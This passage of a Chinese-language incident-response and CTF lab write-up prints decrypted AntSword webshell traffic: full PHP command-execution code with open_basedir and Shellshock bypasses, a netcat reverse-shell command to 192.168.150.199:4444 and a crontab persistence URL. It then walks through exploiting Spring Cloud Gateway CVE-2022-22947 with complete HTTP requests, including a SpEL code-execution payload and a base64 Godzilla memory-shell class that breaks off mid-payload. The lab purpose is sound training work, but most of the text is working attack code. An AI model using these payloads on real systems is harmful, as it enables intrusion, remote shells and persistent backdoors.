",$o));}elseif(fe('popen')){$fp=@popen($c,'r');while(!@feof($fp)){print(@fgets($fp,2048));}@pclose($fp);}elseif(fe('proc_open')){$p = @proc_open($c, array(1 => array('pipe', 'w'), 2 => array('pipe', 'w')), $io);while(!@feof($io[1])){print(@fgets($io[1],2048));}while(!@feof($io[2])){print(@fgets($io[2],2048));}@fclose($io[1]);@fclose($io[2]);@proc_close($p);}elseif(fe('antsystem')){@antsystem($c);}elseif(runshellshock($d, $c)) {return $ret;}elseif(substr($d,0,1)!="/" && @class_exists("COM")){$w=new COM('WScript.shell');$e=$w->exec($c);$so=$e->StdOut();$ret.=$so->ReadAll();$se=$e->StdErr();$ret.=$se->ReadAll();print($ret);}else{$ret = 127;}return $ret;};$ret=@runcmd($r." 2>&1");print ($ret!=0)?"ret={$ret}":"";;}catch(Exception $e){echo "ERROR://".$e->getMessage();};asoutput();die();

流量编号: 52406
解密数据：
i_set("display_errors", "0");@set_time_limit(0);$opdir=@ini_get("open_basedir");if($opdir) {$ocwd=dirname($_SERVER["SCRIPT_FILENAME"]);$oparr=preg_split(base64_decode("Lzt8Oi8="),$opdir);@array_push($oparr,$ocwd,sys_get_temp_dir());foreach($oparr as $item) {if(!@is_writable($item)){continue;};$tmdir=$item."/.24a648ff1";@mkdir($tmdir);if(!@file_exists($tmdir)){continue;}$tmdir=realpath($tmdir);@chdir($tmdir);@ini_set("open_basedir", "..");$cntarr=@preg_split("/\\\\|\//",$tmdir);for($i=0;$i<sizeof($cntarr);$i++){@chdir("..");};@ini_set("open_basedir","/");@rmdir($tmdir);break;};};;function asenc($out){return $out;};function asoutput(){$output=ob_get_contents();ob_end_clean();echo "ce72"."eee0f";echo @asenc($output);echo "2f304"."3582d5";}ob_start();try{$p=base64_decode(substr($_POST["s8e70313b6fdd9"],2));$s=base64_decode(substr($_POST["s59b550e33ea1f"],2));$envstr=@base64_decode(substr($_POST["fc745b55a723ae"],2));$d=dirname($_SERVER["SCRIPT_FILENAME"]);$c=substr($d,0,1)=="/"?"-c \"{$s}\"":"/c \"{$s}\"";if(substr($d,0,1)=="/"){@putenv("PATH=".getenv("PATH").":/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin");}else{@putenv("PATH=".getenv("PATH").";C:/Windows/system32;C:/Windows/SysWOW64;C:/Windows;C:/Windows/System32/WindowsPowerShell/v1.0/;");}if(!empty($envstr)){$envarr=explode("|||asline|||", $envstr);foreach($envarr as $v) {if (!empty($v)) {@putenv(str_replace("|||askey|||", "=", $v));}}}$r="{$p} {$c}";function fe($f){$d=explode(",",@ini_get("disable_functions"));if(empty($d)){$d=array();}else{$d=array_map('trim',array_map('strtolower',$d));}return(function_exists($f)&&is_callable($f)&&!in_array($f,$d));};function runshellshock($d, $c) {if (substr($d, 0, 1) == "/" && fe('putenv') && (fe('error_log') || fe('mail'))) {if (strstr(readlink("/bin/sh"), "bash") != FALSE) {$tmp = tempnam(sys_get_temp_dir(), 'as');putenv("PHP_LOL=() { x; }; $c >$tmp 2>&1");if (fe('error_log')) {error_log("a", 1);} else {mail("a@127.0.0.1", "", "", "-bv");}} else {return False;}$output = @file_get_contents($tmp);@unlink($tmp);if ($output != "") {print($output);return True;}}return False;};function runcmd($c){$ret=0;$d=dirname($_SERVER["SCRIPT_FILENAME"]);if(fe('system')){@system($c,$ret);}elseif(fe('passthru')){@passthru($c,$ret);}elseif(fe('shell_exec')){print(@shell_exec($c));}elseif(fe('exec')){@exec($c,$o,$ret);print(join("
",$o));}elseif(fe('popen')){$fp=@popen($c,'r');while(!@feof($fp)){print(@fgets($fp,2048));}@pclose($fp);}elseif(fe('proc_open')){$p = @proc_open($c, array(1 => array('pipe', 'w'), 2 => array('pipe', 'w')), $io);while(!@feof($io[1])){print(@fgets($io[1],2048));}while(!@feof($io[2])){print(@fgets($io[2],2048));}@fclose($io[1]);@fclose($io[2]);@proc_close($p);}elseif(fe('antsystem')){@antsystem($c);}elseif(runshellshock($d, $c)) {return $ret;}elseif(substr($d,0,1)!="/" && @class_exists("COM")){$w=new COM('WScript.shell');$e=$w->exec($c);$so=$e->StdOut();$ret.=$so->ReadAll();$se=$e->StdErr();$ret.=$se->ReadAll();print($ret);}else{$ret = 127;}return $ret;};$ret=@runcmd($r." 2>&1");print ($ret!=0)?"ret={$ret}":"";;}catch(Exception $e){echo "ERROR://".$e->getMessage();};asoutput();die();

流量编号: 52406
解密数据：
cd "/";nc -e /bin/bash 192.168.150.199 4444;echo 0ca0765e;pwd;echo 36a714

流量编号: 52406
解密数据：
/bin/sh

流量编号: 52592
解密数据：
i_set("display_errors", "0");@set_time_limit(0);$opdir=@ini_get("open_basedir");if($opdir) {$ocwd=dirname($_SERVER["SCRIPT_FILENAME"]);$oparr=preg_split(base64_decode("Lzt8Oi8="),$opdir);@array_push($oparr,$ocwd,sys_get_temp_dir());foreach($oparr as $item) {if(!@is_writable($item)){continue;};$tmdir=$item."/.709087dbffa7";@mkdir($tmdir);if(!@file_exists($tmdir)){continue;}$tmdir=realpath($tmdir);@chdir($tmdir);@ini_set("open_basedir", "..");$cntarr=@preg_split("/\\\\|\//",$tmdir);for($i=0;$i<sizeof($cntarr);$i++){@chdir("..");};@ini_set("open_basedir","/");@rmdir($tmdir);break;};};;function asenc($out){return $out;};function asoutput(){$output=ob_get_contents();ob_end_clean();echo "2ba750"."10f66a";echo @asenc($output);echo "bf"."302";}ob_start();try{$p=base64_decode(substr($_POST["s8e70313b6fdd9"],2));$s=base64_decode(substr($_POST["s59b550e33ea1f"],2));$envstr=@base64_decode(substr($_POST["fc745b55a723ae"],2));$d=dirname($_SERVER["SCRIPT_FILENAME"]);$c=substr($d,0,1)=="/"?"-c \"{$s}\"":"/c \"{$s}\"";if(substr($d,0,1)=="/"){@putenv("PATH=".getenv("PATH").":/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin");}else{@putenv("PATH=".getenv("PATH").";C:/Windows/system32;C:/Windows/SysWOW64;C:/Windows;C:/Windows/System32/WindowsPowerShell/v1.0/;");}if(!empty($envstr)){$envarr=explode("|||asline|||", $envstr);foreach($envarr as $v) {if (!empty($v)) {@putenv(str_replace("|||askey|||", "=", $v));}}}$r="{$p} {$c}";function fe($f){$d=explode(",",@ini_get("disable_functions"));if(empty($d)){$d=array();}else{$d=array_map('trim',array_map('strtolower',$d));}return(function_exists($f)&&is_callable($f)&&!in_array($f,$d));};function runshellshock($d, $c) {if (substr($d, 0, 1) == "/" && fe('putenv') && (fe('error_log') || fe('mail'))) {if (strstr(readlink("/bin/sh"), "bash") != FALSE) {$tmp = tempnam(sys_get_temp_dir(), 'as');putenv("PHP_LOL=() { x; }; $c >$tmp 2>&1");if (fe('error_log')) {error_log("a", 1);} else {mail("a@127.0.0.1", "", "", "-bv");}} else {return False;}$output = @file_get_contents($tmp);@unlink($tmp);if ($output != "") {print($output);return True;}}return False;};function runcmd($c){$ret=0;$d=dirname($_SERVER["SCRIPT_FILENAME"]);if(fe('system')){@system($c,$ret);}elseif(fe('passthru')){@passthru($c,$ret);}elseif(fe('shell_exec')){print(@shell_exec($c));}elseif(fe('exec')){@exec($c,$o,$ret);print(join("
",$o));}elseif(fe('popen')){$fp=@popen($c,'r');while(!@feof($fp)){print(@fgets($fp,2048));}@pclose($fp);}elseif(fe('proc_open')){$p = @proc_open($c, array(1 => array('pipe', 'w'), 2 => array('pipe', 'w')), $io);while(!@feof($io[1])){print(@fgets($io[1],2048));}while(!@feof($io[2])){print(@fgets($io[2],2048));}@fclose($io[1]);@fclose($io[2]);@proc_close($p);}elseif(fe('antsystem')){@antsystem($c);}elseif(runshellshock($d, $c)) {return $ret;}elseif(substr($d,0,1)!="/" && @class_exists("COM")){$w=new COM('WScript.shell');$e=$w->exec($c);$so=$e->StdOut();$ret.=$so->ReadAll();$se=$e->StdErr();$ret.=$se->ReadAll();print($ret);}else{$ret = 127;}return $ret;};$ret=@runcmd($r." 2>&1");print ($ret!=0)?"ret={$ret}":"";;}catch(Exception $e){echo "ERROR://".$e->getMessage();};asoutput();die();

流量编号: 52592
解密数据：
cd "/";nc -e /bin/bash 192.168.150.199 4444;echo 0ca0765e;pwd;echo 36a714

流量编号: 52592
解密数据：
/bin/sh


进程已结束,退出代码0
```
![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710164506596.png)

找到反弹shell命令

```
flag{192.168.150.199:4444}
```

1. 提交黑客上传恶意文件的 md5 md5sum xxx.so
   根目录下有一个so文件

```
/module.so
flag{d41d8cd98f00b204e9800998ecf8427e}
```

1. 攻击者在服务器内权限维持请求外部地址和恶意文件的地址 flag{http://xxxxxxxxxx/xx.xxx}

```
find / -newerct '2023-12-21 07:00:00' ! -newerct '2023-12-21 23:59:59' ! -path '/proc/*' ! -path /'sys/*' ! -path '/run/*' -type f -exec ls -lctr --full-time {} \+ 2>/dev/null
```
![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710164526744.png)

![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710164529269.png)

```
cat /etc/crontab
http://192.168.150.199:88/shell.php
```

# 应急响应-vulntarget-k-02

服务是在8800端口
[vulntarget-k-write-up](https://mp.weixin.qq.com/s/LHq8O2F-r6rbhVW84Q4KEg)
通过漏洞获取权限，执行uname -a 的结果 flag{Dxxxxxxxxx GNU/Linux}
存在spring boot未授权访问

```
http://68.79.23.193:8800/actuator/env
```
![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710164538728.png)

跟着文章打
打**Spring-Cloud-CVE-2022-22947**
漏洞利用exp如下：
先创建一个路由，返回201表示创建成功

```
POST /actuator/gateway/routes/bolean HTTP/1.1
Host:192.168.100.50:8800
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Connection: close
Content-Type: application/json
Content-Length: 329

{
  "id": "bolean",
  "filters": [{
    "name": "AddResponseHeader",
    "args": {
      "name": "Result",
      "value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"id\"}).getInputStream()))}"
    }
  }],
  "uri": "http://example.com"
}
```
![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710164553040.png)

访问路由：
以post方法

```
/actuator/gateway/refresh
```
![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710164604076.png)

/actuator/gateway/routes/bolean

![](../_Attachment/玄机应急响应wp(先知).assets/image-20240710164611958.png)

成功rce
接下来就是写shell了，写哥斯拉马的payload

```
POST /actuator/gateway/routes/bolean1 HTTP/1.1
Host: 192.168.100.50:8800
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Connection: close
Content-Type: application/json
Content-Length: 10956

{
      "id": "bolean1",
      "filters": [{
        "name": "AddResponseHeader",
        "args": {
            "name": "Result",
            "value": "#{T(org.springframework.cglib.core.ReflectUtils).defineClass('ms.GMemShell',T(org.springframework.util.Base64Utils).decodeFromString('yv66vgAAADQBeAoADQC2BwC3CgACALYJABIAuAoAAgC5CQASALoKAAIAuwoAEgC8CQASAL0KAA0AvggAcgcAvwcAwAcAwQcAwgoADADDCgAOAMQHAMUIAJ8HAMYHAMcKAA8AyAsAyQDKCgASALYKAA4AywgAzAcAzQoAGwDOCADPBwDQBwDRCgDSANMKANIA1AoAHgDVBwDWCACBBwCECQDXANgKANcA2QgA2goA2wDcBwDdCgAVAN4KACoA3woA2wDgCgDbAOEIAOIKAOMA5AoAFQDlCgDjAOYHAOcKAOMA6AoAMwDpCgAzAOoKABUA6wgA7AoADADtCADuCgAMAO8IAPAIAPEKAAwA8ggA8wgA9AgA9QgA9ggA9wsAFAD4EgAAAP4KAP8BAAcBAQkBAgEDCgBHAQQKABsBBQsBBgEHCgASAQgKABIBCQkAEgEKCAELCwEMAQ0KABIBDgsBDAEPCAEQBwERCgBUALYKAA0BEgoAFQETCgANALsKAFQBFAoAEgEVCgAVARYKAP8BFwcBGAoAXQC2CABlCAEZAQAFc3RvcmUBAA9MamF2YS91dGlsL01hcDsBAAlTaWduYXR1cmUBADVMamF2YS91dGlsL01hcDxMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL09iamVjdDs+OwEABHBhc3MBABJMamF2YS9sYW5nL1N0cmluZzsBAANtZDUBAAJ4YwEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAOTG1zL0dNZW1TaGVsbDsBAAhkb0luamVjdAEAOChMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQAVcmVnaXN0ZXJIYW5kbGVyTWV0aG9kAQAaTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBAA5leGVjdXRlQ29tbWFuZAEAEnJlcXVlc3RNYXBwaW5nSW5mbwEAQ0xvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9yZWFjdGl2ZS9yZXN1bHQvbWV0aG9kL1JlcXVlc3RNYXBwaW5nSW5mbzsBAANtc2cBAAFlAQAVTGphdmEvbGFuZy9FeGNlcHRpb247AQADb2JqAQASTGphdmEvbGFuZy9PYmplY3Q7AQAEcGF0aAEADVN0YWNrTWFwVGFibGUHAM0HAMcBABBNZXRob2RQYXJhbWV0ZXJzAQALZGVmaW5lQ2xhc3MBABUoW0IpTGphdmEvbGFuZy9DbGFzczsBAApjbGFzc2J5dGVzAQACW0IBAA51cmxDbGFzc0xvYWRlcgEAGUxqYXZhL25ldC9VUkxDbGFzc0xvYWRlcjsBAAZtZXRob2QBAApFeGNlcHRpb25zAQABeAEAByhbQlopW0IBAAFjAQAVTGphdmF4L2NyeXB0by9DaXBoZXI7AQABcwEAAW0BAAFaBwDFBwEaAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBAB1MamF2YS9zZWN1cml0eS9NZXNzYWdlRGlnZXN0OwEAA3JldAEADGJhc2U2NEVuY29kZQEAFihbQilMamF2YS9sYW5nL1N0cmluZzsBAAdFbmNvZGVyAQAGYmFzZTY0AQARTGphdmEvbGFuZy9DbGFzczsBAAJicwEABXZhbHVlAQAMYmFzZTY0RGVjb2RlAQAWKExqYXZhL2xhbmcvU3RyaW5nOylbQgEAB2RlY29kZXIBAANjbWQBAF0oTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZlci9TZXJ2ZXJXZWJFeGNoYW5nZTspTG9yZy9zcHJpbmdmcmFtZXdvcmsvaHR0cC9SZXNwb25zZUVudGl0eTsBAAxidWZmZXJTdHJlYW0BAAJleAEABXBkYXRhAQAyTG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZlci9TZXJ2ZXJXZWJFeGNoYW5nZTsBABlSdW50aW1lVmlzaWJsZUFubm90YXRpb25zAQA1TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2JpbmQvYW5ub3RhdGlvbi9Qb3N0TWFwcGluZzsBAAQvY21kAQANbGFtYmRhJGNtZCQxMQEARyhMb3JnL3NwcmluZ2ZyYW1ld29yay91dGlsL011bHRpVmFsdWVNYXA7KUxyZWFjdG9yL2NvcmUvcHVibGlzaGVyL01vbm87AQAGYXJyT3V0AQAfTGphdmEvaW8vQnl0ZUFycmF5T3V0cHV0U3RyZWFtOwEAAWYBAAJpZAEABGRhdGEBAChMb3JnL3NwcmluZ2ZyYW1ld29yay91dGlsL011bHRpVmFsdWVNYXA7AQAGcmVzdWx0AQAZTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwcAtwEACDxjbGluaXQ+AQAKU291cmNlRmlsZQEADkdNZW1TaGVsbC5qYXZhDABpAGoBABdqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcgwAZQBmDAEbARwMAGgAZgwBHQEeDABnAJIMAGcAZgwBHwEgAQAPamF2YS9sYW5nL0NsYXNzAQAQamF2YS9sYW5nL09iamVjdAEAGGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZAEAQW9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3JlYWN0aXZlL3Jlc3VsdC9tZXRob2QvUmVxdWVzdE1hcHBpbmdJbmZvDAEhASIMASMBJAEADG1zL0dNZW1TaGVsbAEAMG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL3NlcnZlci9TZXJ2ZXJXZWJFeGNoYW5nZQEAEGphdmEvbGFuZy9TdHJpbmcMASUBKAcBKQwBKgErDAEsAS0BAAJvawEAE2phdmEvbGFuZy9FeGNlcHRpb24MAS4AagEABWVycm9yAQAXamF2YS9uZXQvVVJMQ2xhc3NMb2FkZXIBAAxqYXZhL25ldC9VUkwHAS8MATABMQwBMgEzDABpATQBABVqYXZhL2xhbmcvQ2xhc3NMb2FkZXIHATUMATYAmQwBNwE4AQADQUVTBwEaDAE5AToBAB9qYXZheC9jcnlwdG8vc3BlYy9TZWNyZXRLZXlTcGVjDAE7ATwMAGkBPQwBPgE/DAFAAUEBAANNRDUHAUIMATkBQwwBRAFFDAFGAUcBABRqYXZhL21hdGgvQmlnSW50ZWdlcgwBSAE8DABpAUkMAR0BSgwBSwEeAQAQamF2YS51dGlsLkJhc2U2NAwBTAFNAQAKZ2V0RW5jb2RlcgwBTgEiAQAOZW5jb2RlVG9TdHJpbmcBABZzdW4ubWlzYy5CQVNFNjRFbmNvZGVyDAFPAVABAAZlbmNvZGUBAApnZXREZWNvZGVyAQAGZGVjb2RlAQAWc3VuLm1pc2MuQkFTRTY0RGVjb2RlcgEADGRlY29kZUJ1ZmZlcgwBUQFSAQAQQm9vdHN0cmFwTWV0aG9kcw8GAVMQAVQPBwFVEACpDAFWAVcHAVgMAVkBWgEAJ29yZy9zcHJpbmdmcmFtZXdvcmsvaHR0cC9SZXNwb25zZUVudGl0eQcBWwwBXAFdDABpAV4MAV8BHgcBYAwBYQFUDACcAJ0MAIkAigwAYQBiAQAHcGF5bG9hZAcBYgwBYwFUDACBAIIMAWQBZQEACnBhcmFtZXRlcnMBAB1qYXZhL2lvL0J5dGVBcnJheU91dHB1dFN0cmVhbQwBZgFnDAFoAWkMAWoBPAwAlQCWDAFoAUoMAWsBbAEAEWphdmEvdXRpbC9IYXNoTWFwAQAQM2M2ZTBiOGE5YzE1MjI0YQEAE2phdmF4L2NyeXB0by9DaXBoZXIBAAZhcHBlbmQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAAh0b1N0cmluZwEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAIZ2V0Q2xhc3MBABMoKUxqYXZhL2xhbmcvQ2xhc3M7AQARZ2V0RGVjbGFyZWRNZXRob2QBAEAoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQANc2V0QWNjZXNzaWJsZQEABChaKVYBAAVwYXRocwEAB0J1aWxkZXIBAAxJbm5lckNsYXNzZXMBAGAoW0xqYXZhL2xhbmcvU3RyaW5nOylMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvcmVhY3RpdmUvcmVzdWx0L21ldGhvZC9SZXF1ZXN0TWFwcGluZ0luZm8kQnVpbGRlcjsBAElvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9yZWFjdGl2ZS9yZXN1bHQvbWV0aG9kL1JlcXVlc3RNYXBwaW5nSW5mbyRCdWlsZGVyAQAFYnVpbGQBAEUoKUxvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9yZWFjdGl2ZS9yZXN1bHQvbWV0aG9kL1JlcXVlc3RNYXBwaW5nSW5mbzsBAAZpbnZva2UBADkoTGphdmEvbGFuZy9PYmplY3Q7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAA9wcmludFN0YWNrVHJhY2UBABBqYXZhL2xhbmcvVGhyZWFkAQANY3VycmVudFRocmVhZAEAFCgpTGphdmEvbGFuZy9UaHJlYWQ7AQAVZ2V0Q29udGV4dENsYXNzTG9hZGVyAQAZKClMamF2YS9sYW5nL0NsYXNzTG9hZGVyOwEAKShbTGphdmEvbmV0L1VSTDtMamF2YS9sYW5nL0NsYXNzTG9hZGVyOylWAQARamF2YS9sYW5nL0ludGVnZXIBAARUWVBFAQAHdmFsdWVPZgEAFihJKUxqYXZhL2xhbmcvSW50ZWdlcjsBAAtnZXRJbnN0YW5jZQEAKShMamF2YS9sYW5nL1N0cmluZzspTGphdmF4L2NyeXB0by9DaXBoZXI7AQAIZ2V0Qnl0ZXMBAAQoKVtCAQAXKFtCTGphdmEvbGFuZy9TdHJpbmc7KVYBAARpbml0AQAXKElMamF2YS9zZWN1cml0eS9LZXk7KVYBAAdkb0ZpbmFsAQAGKFtCKVtCAQAbamF2YS9zZWN1cml0eS9NZXNzYWdlRGlnZXN0AQAxKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9zZWN1cml0eS9NZXNzYWdlRGlnZXN0OwEABmxlbmd0aAEAAygpSQEABnVwZGF0ZQEAByhbQklJKVYBAAZkaWdlc3QBAAYoSVtCKVYBABUoSSlMamF2YS9sYW5nL1N0cmluZzsBAAt0b1VwcGVyQ2FzZQEAB2Zvck5hbWUBACUoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvQ2xhc3M7AQAJZ2V0TWV0aG9kAQALbmV3SW5zdGFuY2UBABQoKUxqYXZhL2xhbmcvT2JqZWN0OwEAC2dldEZvcm1EYXRhAQAfKClMcmVhY3Rvci9jb3JlL3B1Ymxpc2hlci9Nb25vOwoBbQFuAQAmKExqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsKABIBbwEABWFwcGx5AQAtKExtcy9HTWVtU2hlbGw7KUxqYXZhL3V0aWwvZnVuY3Rpb24vRnVuY3Rpb247AQAbcmVhY3Rvci9jb3JlL3B1Ymxpc2hlci9Nb25vAQAHZmxhdE1hcAEAPChMamF2YS91dGlsL2Z1bmN0aW9uL0Z1bmN0aW9uOylMcmVhY3Rvci9jb3JlL3B1Ymxpc2hlci9Nb25vOwEAI29yZy9zcHJpbmdmcmFtZXdvcmsvaHR0cC9IdHRwU3RhdHVzAQACT0sBACVMb3JnL3NwcmluZ2ZyYW1ld29yay9odHRwL0h0dHBTdGF0dXM7AQA6KExqYXZhL2xhbmcvT2JqZWN0O0xvcmcvc3ByaW5nZnJhbWV3b3JrL2h0dHAvSHR0cFN0YXR1czspVgEACmdldE1lc3NhZ2UBACZvcmcvc3ByaW5nZnJhbWV3b3JrL3V0aWwvTXVsdGlWYWx1ZU1hcAEACGdldEZpcnN0AQANamF2YS91dGlsL01hcAEAA2dldAEAA3B1dAEAOChMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQAGZXF1YWxzAQAVKExqYXZhL2xhbmcvT2JqZWN0OylaAQAJc3Vic3RyaW5nAQAWKElJKUxqYXZhL2xhbmcvU3RyaW5nOwEAC3RvQnl0ZUFycmF5AQAEanVzdAEAMShMamF2YS9sYW5nL09iamVjdDspTHJlYWN0b3IvY29yZS9wdWJsaXNoZXIvTW9ubzsHAXAMAXEBdAwAqACpAQAiamF2YS9sYW5nL2ludm9rZS9MYW1iZGFNZXRhZmFjdG9yeQEAC21ldGFmYWN0b3J5BwF2AQAGTG9va3VwAQDMKExqYXZhL2xhbmcvaW52b2tlL01ldGhvZEhhbmRsZXMkTG9va3VwO0xqYXZhL2xhbmcvU3RyaW5nO0xqYXZhL2xhbmcvaW52b2tlL01ldGhvZFR5cGU7TGphdmEvbGFuZy9pbnZva2UvTWV0aG9kVHlwZTtMamF2YS9sYW5nL2ludm9rZS9NZXRob2RIYW5kbGU7TGphdmEvbGFuZy9pbnZva2UvTWV0aG9kVHlwZTspTGphdmEvbGFuZy9pbnZva2UvQ2FsbFNpdGU7BwF3AQAlamF2YS9sYW5nL2ludm9rZS9NZXRob2RIYW5kbGVzJExvb2t1cAEAHmphdmEvbGFuZy9pbnZva2UvTWV0aG9kSGFuZGxlcwAhABIADQAAAAQACQBhAGIAAQBjAAAAAgBkAAkAZQBmAAAACQBnAGYAAAAJAGgAZgAAAAoAAQBpAGoAAQBrAAAALwABAAEAAAAFKrcAAbEAAAACAGwAAAAGAAEAAAAWAG0AAAAMAAEAAAAFAG4AbwAAAAkAcABxAAIAawAAAUgABwAGAAAAkLsAAlm3AAOyAAS2AAWyAAa2AAW2AAe4AAizAAkqtgAKEgsGvQAMWQMSDVNZBBIOU1kFEg9TtgAQTi0EtgAREhISEwS9AAxZAxIUU7YAEDoEBL0AFVkDK1O4ABa5ABcBADoFLSoGvQANWQO7ABJZtwAYU1kEGQRTWQUZBVO2ABlXEhpNpwALTi22ABwSHU0ssAABAAAAgwCGABsAAwBsAAAAMgAMAAAAHQAcAB4AOQAfAD4AIABQACEAYgAiAIAAIwCDACcAhgAkAIcAJQCLACYAjgAoAG0AAABSAAgAOQBKAHIAcwADAFAAMwB0AHMABABiACEAdQB2AAUAgwADAHcAZgACAIcABwB4AHkAAwAAAJAAegB7AAAAAACQAHwAZgABAI4AAgB3AGYAAgB9AAAADgAC9wCGBwB+/AAHBwB/AIAAAAAJAgB6AAAAfAAAAAoAgQCCAAMAawAAAJ4ABgADAAAAVLsAHlkDvQAfuAAgtgAhtwAiTBIjEiQGvQAMWQMSJVNZBLIAJlNZBbIAJlO2ABBNLAS2ABEsKwa9AA1ZAypTWQQDuAAnU1kFKr64ACdTtgAZwAAMsAAAAAIAbAAAABIABAAAAC0AEgAuAC8ALwA0ADAAbQAAACAAAwAAAFQAgwCEAAAAEgBCAIUAhgABAC8AJQCHAHMAAgCIAAAABAABABsAgAAAAAUBAIMAAAABAIkAigACAGsAAADXAAYABAAAACsSKLgAKU4tHJkABwSnAAQFuwAqWbIABrYAKxIotwAstgAtLSu2AC6wTgGwAAEAAAAnACgAGwADAGwAAAAWAAUAAAA1AAYANgAiADcAKAA4ACkAOQBtAAAANAAFAAYAIgCLAIwAAwApAAIAeAB5AAMAAAArAG4AbwAAAAAAKwCNAIQAAQAAACsAjgCPAAIAfQAAADwAA/8ADwAEBwCQBwAlAQcAkQABBwCR/wAAAAQHAJAHACUBBwCRAAIHAJEB/wAXAAMHAJAHACUBAAEHAH4AgAAAAAkCAI0AAACOAAAACQBnAJIAAgBrAAAApwAEAAMAAAAwAUwSL7gAME0sKrYAKwMqtgAxtgAyuwAzWQQstgA0twA1EBC2ADa2ADdMpwAETSuwAAEAAgAqAC0AGwADAGwAAAAeAAcAAAA+AAIAQQAIAEIAFQBDACoARQAtAEQALgBGAG0AAAAgAAMACAAiAI4AkwACAAAAMACNAGYAAAACAC4AlABmAAEAfQAAABMAAv8ALQACBwB/BwB/AAEHAH4AAIAAAAAFAQCNAAAACQCVAJYAAwBrAAABRAAGAAUAAAByAU0SOLgAOUwrEjoBtgA7KwG2ABlOLbYAChI8BL0ADFkDEiVTtgA7LQS9AA1ZAypTtgAZwAAVTacAOU4SPbgAOUwrtgA+OgQZBLYAChI/BL0ADFkDEiVTtgA7GQQEvQANWQMqU7YAGcAAFU2nAAU6BCywAAIAAgA3ADoAGwA7AGsAbgAbAAMAbAAAADIADAAAAEsAAgBNAAgATgAVAE8ANwBXADoAUAA7AFIAQQBTAEcAVABrAFYAbgBVAHAAWABtAAAASAAHABUAIgCXAHsAAwAIADIAmACZAAEARwAkAJcAewAEAEEALQCYAJkAAQA7ADUAeAB5AAMAAAByAJoAhAAAAAIAcACbAGYAAgB9AAAAKgAD/wA6AAMHACUABwB/AAEHAH7/ADMABAcAJQAHAH8HAH4AAQcAfvoAAQCIAAAABAABABsAgAAAAAUBAJoAAAAJAJwAnQADAGsAAAFKAAYABQAAAHgBTRI4uAA5TCsSQAG2ADsrAbYAGU4ttgAKEkEEvQAMWQMSFVO2ADstBL0ADVkDKlO2ABnAACXAACVNpwA8ThJCuAA5TCu2AD46BBkEtgAKEkMEvQAMWQMSFVO2ADsZBAS9AA1ZAypTtgAZwAAlwAAlTacABToELLAAAgACADoAPQAbAD4AcQB0ABsAAwBsAAAAMgAMAAAAXQACAF8ACABgABUAYQA6AGkAPQBiAD4AZABEAGUASgBmAHEAaAB0AGcAdgBqAG0AAABIAAcAFQAlAJ4AewADAAgANQCYAJkAAQBKACcAngB7AAQARAAwAJgAmQABAD4AOAB4AHkAAwAAAHgAmgBmAAAAAgB2AJsAhAACAH0AAAAqAAP/AD0AAwcAfwAHACUAAQcAfv8ANgAEBwB/AAcAJQcAfgABBwB++gABAIgAAAAEAAEAGwCAAAAABQEAmgAAACEAnwCgAAMAawAAAJQABAADAAAALCu5AEQBACq6AEUAALYARk27AEdZLLIASLcASbBNuwBHWSy2AEqyAEi3AEmwAAEAAAAbABwAGwADAGwAAAASAAQAAABxABAAiAAcAIkAHQCKAG0AAAAqAAQAEAAMAKEAewACAB0ADwCiAHkAAgAAACwAbgBvAAAAAAAsAKMApAABAH0AAAAGAAFcBwB+AIAAAAAFAQCjAAAApQAAAA4AAQCmAAEAm1sAAXMApxACAKgAqQACAGsAAAGYAAQABwAAAMC7AAJZtwADTSuyAAS5AEsCAMAAFU4qLbgATAO2AE06BLIAThJPuQBQAgDHABayAE4STxkEuABRuQBSAwBXpwBusgBOElMZBLkAUgMAV7sAVFm3AFU